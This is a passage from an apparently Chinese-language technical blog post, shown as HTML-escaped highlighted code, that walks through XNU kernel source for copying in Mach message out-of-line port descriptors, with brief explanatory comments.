    &lt;span class=&quot;n&quot;&gt;user_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_base_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 判断是否需要左移，默认只有1个descriptor的大小，1个长度是16字节，我们设置的是1个，所以不需要移动&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dsc_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dsc_adjust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dsc_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;descriptor_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dsc_adjust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_base_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dsc_adjust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dsc_adjust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;kern_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_base_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* handle the OOL regions and port descriptors. */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dsc_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_OOL_PORTS_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
                &lt;span class=&quot;n&quot;&gt;user_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_copyin_ool_ports_descriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_ool_ports_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kern_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
				            &lt;span class=&quot;n&quot;&gt;user_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_task_64bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optionp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;kern_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;complex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* End of loop */&lt;/span&gt; 
    
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_copyin_ool_ports_descriptor()&lt;/code&gt;专注处理OOL数据，调用了一个关键的函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_object_copyin()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ipc_kmsg_copyin_ool_ports_descriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_ool_ports_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dsc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_dsc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_64bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_option_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optionp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_vm_offset_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_type_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_disp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_type_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result_disp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_type_number_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_copy_options_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copy_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;boolean_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;deallocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_type_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;vm_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ports_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;names_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_64bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;mach_msg_ool_ports_descriptor64_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_ool_dsc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_ool_dsc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_dsc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_ool_dsc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_ool_dsc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;deallocate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_ool_dsc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;deallocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;copy_option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_ool_dsc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;user_disp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_ool_dsc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_ool_dsc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;user_dsc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_dsc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_ool_dsc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
&lt;span class=&quot;cp&quot;&gt;#ifdef __LP64__
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;names&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#else
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;names&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif
&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dsc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_PORT_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CAST_MACH_NAME_TO_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_object_copyin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_disp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_dsc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

